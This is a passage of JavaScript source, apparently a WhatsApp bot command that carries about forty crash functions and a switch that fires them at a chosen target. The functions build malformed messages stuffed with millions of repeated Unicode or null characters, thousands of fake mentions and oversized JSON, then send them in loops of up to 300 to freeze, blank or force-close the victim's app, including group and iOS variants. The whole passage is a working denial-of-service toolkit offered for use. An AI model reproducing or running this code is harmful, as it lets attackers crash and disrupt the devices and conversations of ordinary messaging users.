                viewOnceMessage: {
                    message: {
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "proto@newsletter",
                            serverMessageId: 1,
                            newsletterName: `—͟͞͞🧊 𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓 ${"—͟͞͞🧊 공격 *𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓*".repeat(100)}`,
                            contentType: 3,
                            accessibilityText: `—͟͞͞🧊 𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓 ${"﹏".repeat(1020002)}`
                        },
                        interactiveMessage: {
                            contextInfo: { businessMessageForwardInfo: { businessOwnerJid: target }, dataSharingContext: { showMmDisclosure: true }, participant: "0@s.whatsapp.net", mentionedJid: ["13135550002@s.whatsapp.net"] },
                            body: { text: "" + "ꦽ".repeat(1020002) + "".repeat(1020002) },
                            nativeFlowMessage: {
                                buttons: [{ name: "single_select", buttonParamsJson: venomModsData + "".repeat(990099) }, { name: "payment_method", buttonParamsJson: venomModsData + "".repeat(99909) }, { name: "call_permission_request", buttonParamsJson: venomModsData + "".repeat(99909) }]
                            }
                        }
                    }
                }
            };
            await conn.relayMessage(target, message, { participant: { jid: target } });
        }

        // ============ 19. CarouselVY4 ============
        async function CarouselVY4(target) {
            for (let i = 0; i < 5; i++) {
                const img = {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
                    fileLength: "62265",
                    height: 1080,
                    width: 1080,
                    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
                    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
                    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1756530813"
                };
                const cards = [{
                    header: { hasMediaAttachment: true, imageMessage: img, title: "\u2060".repeat(80000) + "You Hate Me? \n" + i },
                    body: { text: "ꦾ".repeat(99999) },
                    footer: { text: "Made by haters #1st" + i },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [{ name: "single_select", buttonParamsJson: "\u0000".repeat(10000) }, { name: "cta_copy", buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}" }]
                    }
                }];
                const msg = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: "ꦾ".repeat(99999) },
                                header: { hasMediaAttachment: true, imageMessage: img },
                                carouselMessage: { cards }
                            }
                        }
                    }
                }, {});
                await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
                await new Promise(r => setTimeout(r, 500));
            }
        }

        // ============ 20. LocaXotion ============
        async function LocaXotion(target) {
            await conn.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        liveLocationMessage: {
                            degreesLatitude: 197 - 7728 - 82882,
                            degreesLongitude: -111 - 188839938,
                            caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                            sequenceNumber: '0',
                            contextInfo: {
                                forwardingScore: 177,
                                isForwarded: true,
                                quotedMessage: { documentMessage: { contactVcard: true } },
                                groupMentions: [{ groupJid: "1999@newsletter", groupSubject: " Subject " }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }

        // ============ 21. XinsooInvisV1 ============
        async function XinsooInvisV1(target) {
            const msg1 = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "\n".repeat(900000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: ["13527337@s.whastapp.net", ...Array.from({ length: 1900 }, () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")]
                    }
                }
            }, {});
            const msg2 = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "\n".repeat(900000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: ["13527337@s.whastapp.net", ...Array.from({ length: 1900 }, () => "2" + Math.floor(Math.random() * 50000000) + "@s.whatsapp.net")]
                    }
                }
            }, {});
            await conn.relayMessage(target, msg1.message, { messageId: msg1.key.id, participant: { jid: target } });
            await conn.sendMessage(target, { delete: msg1.key });
            await conn.relayMessage(target, msg2.message, { messageId: msg2.key.id, participant: { jid: target } });
            await conn.sendMessage(target, { delete: msg2.key });
        }

        // ============ 22. Xblanknoclick ============
        async function Xblanknoclick(target) {
            const ButtonsPush = [{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "ꦽ".repeat(5000), sections: [{ title: "\u0000", rows: [] }] }) }];
            for (let i = 0; i < 10; i++) {
                ButtonsPush.push({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(500000) }) }, { name: "mpm", buttonParamsJson: JSON.stringify({ status: true }) }, { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) });
            }
            const msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: { title: "ោ៝".repeat(2000000), locationMessage: { degreesLatitude: 0, degreesLongtitude: 0 }, hasMediaAttachment: true },
                            body: { text: "Hay" + "ꦽ".repeat(2500000) + "ោ៝".repeat(2000000) },
                            nativeFlowMessage: { messageParamsJson: "{".repeat(1000000), buttons: ButtonsPush },
                            contextInfo: { participant: target, mentionedJid: ["131338822@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 50000000) + "@s.whatsapp.net")], remoteJid: "X", stanzaId: "1234567890ABCDEF", quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 } } }
                        }
                    }
                }
            }, {});
            await conn.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
        }

        // ============ 23. fcnew ============
        async function fcnew(target) {
            for (let i = 0; i < 100; i++) {
                await CarouselVY4(target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
            }
        }

        // ============ 24. Combo ============
        async function Combo(target) {
            for (let i = 0; i < 100; i++) {
                await callinvisible(target);
                await ForceXFrezee(target);
                await blank1(target);
            }
        }

        // ============ 25. BugGroup ============
        async function BugGroup(target) {
            for (let i = 0; i < 200; i++) {
                await BugGb1(target);
                await BugGb12(target);
                await DelayGroup(target);
                await xgroupnulL(target);
                await BlankGroup(target);
            }
        }

        // ============ 26. BayuOfficialHard ============
        async function BayuOfficialHard(target) {
            for (let i = 0; i < 200; i++) {
                await protoXimg(target);
                await bulldozer(target);
                await protocolbug3(target);
                await delayMakerInvisible(target);
                await xatanicinvisv4(target);
                await protocolbug6(target);
            }
        }

        // ============ 27. XPhone ============
        async function XPhone(target) {
            for (let i = 0; i < 300; i++) {
                await CarouselVY4(target);
                await CrashLoadIos(target);
                await forclose(target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await Xblanknoclick(target);
                await ForceXFrezee(target);
                await blank1(target);
                await callinvisible(target);
            }
        }

        // ============ 28. ForceClose ============
        async function ForceClose(target) {
            for (let i = 0; i < 250; i++) {
                await forclose(target);
            }
        }

        // ============ 29. swVidFreeze ============
        async function swVidFreeze(target, sebut = false) {
            for (let z = 0; z < 50; z++) {
                const media = generateWAMessageFromContent(target, {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "OU+MmRfL9SSO0MZI2VcrC8/Vqr8U+bkKE/bnTg74YY8=",
                        fileLength: 252408,
                        seconds: 15,
                        mediaKey: "Nw/2xPEw0z5yDWluRdpNDAZn8lWUFH1Ui6yjpUoDHpk=",
                        height: 816,
                        width: 768,
                        fileEncSha256: "vz7HOSPHOcj3R8De5glz20ktBJIt8LhkN8gX5t2nLNI=",
                        directPath: "/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0",
                        mediaKeyTimestamp: 1761536267,
                        caption: "Radiation - Ex3cutor" + "ꦾ".repeat(225),
                        contextInfo: {
                            statusAttributionType: 2,
                            isForwarded: true,
                            forwardingScore: 7202508,
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
                        }
                    }
                }, {});
                await conn.relayMessage("status@broadcast", media.message, {
                    messageId: media.key.id,
                    statusJidList: [target],
                    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
                });
            }
        }

        // ============ 30. gsInter ============
        async function gsInter(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`) },
                        body: { text: "\u0000".repeat(200), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(90000000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});
                await conn.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }

        // ============ 31. delay2 ============
        async function delay2(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`) },
                        body: { text: "\u0000".repeat(2000), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(90000000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});
                await conn.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }

        // ============ 32. kill ============
        async function kill(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`) },
                        body: { text: "\u0000".repeat(200), format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(9000000000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});
                await conn.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }

        // ============ 33. rageioshere ============
        async function rageioshere(target) {
            let tmsg = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: '@Radiation\n' + "\n\n\n" + "𑪆".repeat(60000),
                    previewType: 0,
                    contextInfo: { mentionedJid: [target] }
                }
            }, {});
            await conn.relayMessage("status@broadcast", tmsg.message, {
                messageId: tmsg.key.id,
                statusJidList: [target],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
            });
        }

        // ============ 34. zalthrexhytam ============
        async function zalthrexhytam(target) {
            await conn.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: { hasMediaAttachment: false, title: "Radiation¿" + "ꦽ".repeat(500000) },
                            body: { text: "" },
                            nativeFlowMessage: { name: "single_select", messageParamsJson: "" },
                            payment: { name: "galaxy_message", messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}' }
                        }
                    }
                }
            }, {});
        }

        // ============ 35. xatanicinvisv4 ============
        async function xatanicinvisv4(jid) {
            const delay = Array.from({ length: 30000 }, (_, r) => ({ title: "᭡꧈".repeat(950000), rows: [{ title: `${r + 1}`, id: `${r + 1}` }] }));
            const MSG = {
                viewOnceMessage: {
                    message: {
                        listResponseMessage: {
                            title: "assalamualaikum",
                            listType: 2,
                            buttonText: null,
                            sections: delay,
                            singleSelectReply: { selectedRowId: "🔴" },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                                participant: jid,
                                remoteJid: "status@broadcast",
                                forwardingScore: 9741,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: { newsletterJid: "333333333333@newsletter", serverMessageId: 1, newsletterName: "-" }
                            },
                            description: "*𝙏𝙝𝙚 𝙏𝙚𝙘𝙝𝙓 Bothering Me Bro!!*"
                        }
                    }
                },
                contextInfo: { channelMessage: true, statusAttributionType: 2 }
            };
            const msg = generateWAMessageFromContent(jid, MSG, {});
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: jid }, content: undefined }] }] }]
            });
            if (jid) {
                await conn.relayMessage(jid, { statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: "meta", attrs: { is_status_jid: "soker tai" }, content: undefined }] });
            }
        }

        // ============ 36. DelayGroup ============
        async function DelayGroup(target) {
            const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
            await conn.sendMessage(target, {
                text: "XvoludUltra",
                mentions: target,
                contextInfo: { mentionedJid: mentionedList, isGroupMention: true }
            });
        }

        // ============ 37. xgroupnulL ============
        async function xgroupnulL(target) {
            await conn.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: " XvoludUltra", format: "DEFAULT" },
                            nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\u0000".repeat(1000000), version: 3 }
                        },
                        contextInfo: { mentionedJid: [...Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`)] }
                    }
                }
            }, {});
        }

        // ============ 38. BlankGroup ============
        async function BlankGroup(target) {
            await blankgc(target);
            await BugGb1(target);
            await BugGb12(target);
            await rusuhgc(target);
        }

        // ============ 39. oneMsgFC ============
        async function oneMsgFC(target, conn) {
            const video = await prepareWAMessageMedia({ video: { url: 'https://files.catbox.moe/mxg7vh.mp4' } }, { upload: conn.waUploadToServer });
            const cards = [];
            for (let i = 0; i < 10; i++) {
                cards.push({ header: { videoMessage: video.videoMessage, hasMediaAttachment: false }, nativeFlowMessage: { messageParamsJson: "{".repeat(1000000) } });
            }
            const interactive = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: "" },
                            carouselMessage: { cards: cards, messageVersion: 1 },
                            contextInfo: {
                                businessMessageForwardInfo: { businessOwnerJid: target },
                                stanzaId: String(Math.floor(Math.random() * 99999)),
                                forwardingScore: 100,
                                isForwarded: true,
                                mentionedJid: [target]
                            }
                        }
                    }
                }
            };
            const message = generateWAMessageFromContent(target, interactive, { quoted: m });
            await conn.relayMessage(target, message.message, { participant: { jid: target }, messageId: message.key.id });
        }

        // ============ 40. bug3 (Main) ============
        async function bug3(target) {
            for (let i = 0; i < 60; i++) {
                await killgc(target);
                await rusuhgc(target);
                await blankgc(target);
            }
        }

        // Execute based on action
        switch(action) {
            case "forclose": await forclose(from); break;
            case "callinvisible": await callinvisible(from); break;
            case "blank1": await blank1(from); break;
            case "forcexfrezee": await ForceXFrezee(from); break;
            case "killgc": await killgc(from); break;
            case "rusuhgc": await rusuhgc(from); break;
            case "blankgc": await blankgc(from); break;
            case "buggb1": await BugGb1(from); break;
            case "buggb12": await BugGb12(from); break;
            case "vampire": await VampireBugIns(from); break;
            case "vampireinvis": await VampireGroupInvis(from); break;
            case "ioscrash": await CrashLoadIos(from); break;
            case "protoximg": await protoXimg(from); break;
            case "protoxvid": await protoXvid(from); break;
            case "bulldozer": await bulldozer(from); break;
            case "protocolbug3": await protocolbug3(from); break;
            case "protocolbug6": await protocolbug6(from); break;
            case "delaymaker": await delayMakerInvisible(from); break;
            case "carousel": await CarouselVY4(from); break;
            case "location": await LocaXotion(from); break;
            case "xinsoo": await XinsooInvisV1(from); break;
            case "xblank": await Xblanknoclick(from); break;
            case "fcnew": await fcnew(from); break;
            case "combo": await Combo(from); break;
            case "buggroup": await BugGroup(from); break;
            case "bayu": await BayuOfficialHard(from); break;
            case "xphone": await XPhone(from); break;
            case "forceclose": await ForceClose(from); break;
            case "swvid": await swVidFreeze(from); break;
            case "gsinter": await gsInter(from); break;
            case "delay2": await delay2(from); break;
            case "killfunc": await kill(from); break;
            case "rageios": await rageioshere(from); break;
            case "zalthrex": await zalthrexhytam(from); break;
            case "xatanic": await xatanicinvisv4(from); break;
            case "delaygroup": await DelayGroup(from); break;
            case "xgroupnull": await xgroupnulL(from); break;
            case "blankgroup": await BlankGroup(from); break;
            case "onemsg": await oneMsgFC(from, conn); break;
            case "bug3":
            default: await bug3(from); break;
        }

        await reply("✅ Operation completed!");
    }
};